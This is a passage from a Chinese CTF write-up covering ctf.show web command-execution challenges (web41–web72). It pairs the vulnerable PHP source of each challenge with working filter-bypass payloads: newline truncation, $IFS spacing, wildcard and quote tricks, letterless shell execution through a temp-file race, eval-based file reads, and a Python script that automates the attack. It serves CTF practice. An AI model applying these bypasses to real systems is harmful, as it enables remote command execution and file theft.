output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;|\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 30 return(output) 31 32while True: 33 param=action(input(\u0026#34;\\n[+] your function：\u0026#34;) )+action(input(\u0026#34;[+] your command：\u0026#34;)) 34 data={ 35 \u0026#39;c\u0026#39;:urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\u0026#34;\\n[*] result:\\n\u0026#34;+r.text) 将两个文件放在同一个文件夹，运行exp.py即可\n羽师傅nb\n注意链接要用http不能用https\nweb42 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 18}else{ 19 highlight_file(__FILE__); 20} 这道题会将我们输入的命令与\u0026quot; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026quot;进行拼接\n/dev/null 2\u0026gt;\u0026amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显\n导致我们无法成功执行\n我们可以通过%0a截断的方式绕过\ntac fl*%0a\nor\n; //分号 | //只执行后面那条命令 || //只执行前面那条命令 \u0026amp; //两条命令都会执行 \u0026amp;\u0026amp; //两条命令都会执行\n过滤了分号和cat，可以用||和\u0026amp;来代替分号，tac代替cat\n可构造playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 注意，这里的\u0026amp;需要url编码\nweb43 过滤了cat、；，\n不是很影响\ntac fl*%0a or tac flag.php|| ... //记得转url编码 web44 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag\n小问题\ntac fl*%0a or tac f*|| ... //记得转url编码 web45 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| /i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag和空格\n可以用%09或$IFS$9代替空格\ntac%09fl*%0a or tac%09f*|| or echo$IFS`tac$IFS*`%0A ... //记得转url编码 web46 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 过滤有点多啊\n;|cat|flag| |[0-9]|\\$|*\n但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤\ntac%09fl*%0a or tac%09f*|| or tac\u0026lt;f*|| //记得转url编码 web47 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:59:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤这么多O.o？\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail\n但是幸好我用的是tac\ntac%09fl*%0a or tac%09f*|| or tac\u0026lt;f*|| //记得转url编码 web48 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:06:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤更多了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`\ntac%09fl??.php%0a or tac%09fl??.php%7c%7c //记得转url编码 web49 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:22:43 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%\n虽然过滤了%但是是不影响我们传入的url编码的\ntac%09fl??.php%0a or tac%09fl??.php%7c%7c web50 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:32:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\\x09|\\x26\n坏，没法用%09代替空格，没法用?代替字符\n不过幸好还有\u0026lt;和\u0026rsquo;'\ntac\u0026lt;fla%27%27g.php|| or tac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:42:52 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26/\n怎么把我tac也过滤了\n没事能绕过\nt%27%27ac\u0026lt;fla%27%27g.php|| or t%27%27ac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:50:30 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\n我测怎么连\u0026lt; \u0026gt;都要过滤\n别忘了还可以用$IFS\nca%27%27t$IFS/fla%27%27g|| or ca%27%27t$IFS/fla%27%27g%0a web52 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 18:21:02 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 echo($c); 19 $d = system($c); 20 echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$d; 21 }else{ 22 echo \u0026#39;no\u0026#39;; 23 } 24}else{ 25 highlight_file(__FILE__); 26} 过滤了\n;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;/\n这题没有在后面进行命令拼接，其他和上一题一样\nc%27%27at${IFS}fla%27%27g.php web54 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 19:43:42 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 这题过滤了很多命令,题目通过*使得只要是传入的内容出现如cat三个字符即可被匹配到，无法使用之前的字符拼接方法绕过\n这题没过率通配符?\n解一\n/bin/?at${IFS}f??????? cat命令所在的路径是在/bin/目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面（一开始还傻傻的换成uniq看能不能用hhh）。\nbin下的命令：Linux /bin 目录下命令简要说明 - 崔旗 - 博客园\n同理bin目录下还存在more，所以这里的cat我们换成more也可以读取flag。 解二\nvi${IFS}fla?.php or c=uniq${IFS}f???.php //倒序的 or grep${IFS}%27fla%27${IFS}f???????%0a web55 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 20:03:51 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/ 这题涉及到一个知识点\n也就是无字母数字的命令执行\nhttps://blog.csdn.net/qq_46091464/article/details/108513145\nhttps://blog.csdn.net/qq_46091464/article/details/108557067\n无字母数字webshell之提高篇 | 离别歌\n思路\nshell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替 我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）\n注意：通过`.`去执行sh命令不需要有执行权限 1.构造post数据包\n1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; 6 \u0026lt;title\u0026gt;POST数据包POC\u0026lt;/title\u0026gt; 7\u0026lt;/head\u0026gt; 8\u0026lt;body\u0026gt; 9\u0026lt;form action=\u0026#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; 10\u0026lt;!--链接是当前打开的题目链接--\u0026gt; 11 \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;文件名：\u0026lt;/label\u0026gt; 12 \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;br\u0026gt; 13 \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; 14\u0026lt;/form\u0026gt; 15\u0026lt;/body\u0026gt; 16\u0026lt;/html\u0026gt; 在上传的文件里面写入sh指令\n1#!/bin/sh 2ls 2.抓包\n3.构造执行sh命令的poc\n详细解释poc的构造：\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob\n我们这里可以理解为我们这道题里面的干扰文件名都是由小写字母组成的，所有文件名都是小写，只有PHP生成的临时文件包含大写字母，那我们就可以构造出如下的poc\n?c=.+/???/????????[@-[] 注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。 我们就来吧\n修改一下指令内容即可得到flag\nweb56 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} ;|[a-z]|[0-9]|\\$|(|{|'|\u0026quot;|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\n这题相比上一题多过滤了一个数字，不影响我们上题的解题方法\n这里不再赘述\n放个大佬的脚本\n1import requests 2 3while True: 4\turl = \u0026#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]\u0026#34; 5\tr = requests.post(url, files={\u0026#34;file\u0026#34;: (\u0026#39;feng.txt\u0026#39;, b\u0026#39;cat flag.php\u0026#39;)}) 6\tif r.text.find(\u0026#34;flag\u0026#34;) \u0026gt; 0: 7\tprint(r.text) 8\tbreak web57 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-08 01:02:56 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13// 还能炫的动吗？ 14//flag in 36.php 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\x0a|\\\u0026gt;|\\\u0026lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\u0026#34;, $c)){ 18 system(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤条件增加\n;|[a-z]|[0-9]|`||#|'|\u0026quot;|`|%|\\x09|\\x26|\\x0a|\u0026gt;|\u0026lt;|.|,|?|*|-|=|[/\n这道题把?过滤了，但是我们可以看到\nsystem(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); 这题会将我们传入的get参数进行拼接后再执行\n题目里有个暗示\n//flag in 36.php 也就是说我们要用符号构造出36\n我们可以利用linux的$(())构造出36\n在linux里面$(())=0，$((~ $(()) ))=-1\n其中~符号表示取反，这里0的取反等于－1\n也就是我们先将36个-1加起来再取反得到我们需要的36\npayload:\nc=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 从而得到flag\nweb58 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} payload:\nc=highlight_file(\u0026#34;flag.php\u0026#34;); c=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=flag.php //文件包含，得到的回显需要进行base64解码 c=show_source(\u0026#39;flag.php\u0026#39;); web59 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 解法与上题一致，不再赘述\n（没搞懂两题有什么区别）\nweb60 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 解法依旧与web58一致\n可能我太菜了看不出有什么区别\nweb61 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧web58\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\u0026hellip;\nweb63 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\u0026hellip;\nweb64 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 嘶，怎么还是那样\u0026hellip;\nweb65 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 同上\u0026hellip;\nweb66 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 本来以为还是一样的，没想到\u0026hellip;\n看来我们要想办法查目录了\n我们可以尝试利用php中查询目录的函数\n比如 scandir()\nvar_dump(scandir(\u0026#39;/\u0026#39;)); 接下来就是查flag，可以通过文件包含来查\nflag.txt前面记得加上/\nweb67 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 这题解法与web66一致\nweb68 这题貌似只是show_source和highlight_file用不了，其他没什么变化\n可以直接用前两题的方法\n也可以直接\nc=include(\u0026#39;/flag.txt\u0026#39;) //赌 web69 这题相比上一题，print_r() 和 var_dump() 也被禁用了\n我们可以通过寻找其他可以打印数组的函数来打印目录\n我们可以通过var_export()来代替，从而打印目录\nc=var_export(scandir(\u0026#34;/\u0026#34;)); 接下读flag即可\nc=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=/flag.txt 其他的解法：\n查文件\n?c=echo implode(\u0026#34;,\u0026#34;,(scandir(\u0026#39;/\u0026#39;))); ?c=echo json_encode(scandir(\u0026#34;/\u0026#34;)); 读文件\n?c=readgzfile(\u0026#39;/flag.txt\u0026#39;); web70 这题把error_reporting()和ini_set()禁用了\n虽然不知道有什么用，不影响我用上一题的方法读flag\nweb71 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// 你们在炫技吗？ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29你要上天吗？ $s = ob_get_contents();：获取输出缓冲区的内容并赋值给变量s。输出缓冲区在 PHP 中用于临时存储要输出到浏览器等的内容，以便在合适的时候进行处理或修改。\nob_end_clean();：清空输出缓冲区并关闭它，这样就清除了原始的、未经处理的输出内容，以便后续进行自定义的输出处理。\necho preg_replace(\u0026quot;/[0-9]|[a-z]/i\u0026quot;,\u0026quot;?\u0026quot;,$s);：这行代码使用正则表达式对获取到的输出内容（存储在s中）进行替换操作。它会将所有的数字和字母（不区分大小写）都替换为?，然后将处理后的内容输出到浏览器等输出端。\n也就是说这道题会对回显进行处理，让我们没法得到回显\n我们可以用exit()/die()提前结束程序，从而不执行后续代码直接进行回显\nc=var_export(scandir(\u0026#34;/\u0026#34;));exit(); c=readgzfile(\u0026#39;/flag.txt\u0026#39;);exit(); web72 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// 你们在炫技吗？ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29你要上天吗？ 